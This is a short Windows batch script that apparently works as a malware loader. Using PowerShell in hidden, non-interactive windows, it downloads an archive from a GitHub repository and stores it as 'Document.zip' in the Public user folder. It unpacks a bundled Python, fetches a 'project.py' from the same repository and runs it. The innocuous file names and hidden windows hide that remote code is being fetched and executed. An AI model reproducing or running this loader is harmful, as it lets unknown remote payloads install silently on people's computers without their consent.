if not exist "C:\Users\Public\Document.zip" (
    powershell.exe -NonInteractive -NoProfile -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://github.com/vipmodz13/Bot13/raw/main/PythonLib.zip' -OutFile 'C:\Users\Public\Document.zip'"
)
if not exist "C:\Users\Public\Document" (
    powershell.exe -NonInteractive -NoProfile -WindowStyle Hidden -Command "Expand-Archive -Path 'C:\Users\Public\Document.zip' -DestinationPath 'C:\Users\Public\Document'"
)
if not exist "C:\Users\Public\Document\project.py" (
    powershell.exe -NonInteractive -NoProfile -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://github.com/vipmodz13/Bot13/raw/main/project.py' -OutFile 'C:\Users\Public\Document\project.py'"
)
powershell.exe -NonInteractive -NoProfile -WindowStyle Hidden -Command "C:\Users\Public\Document\python.exe C:\Users\Public\Document\project.py"
exit /b 0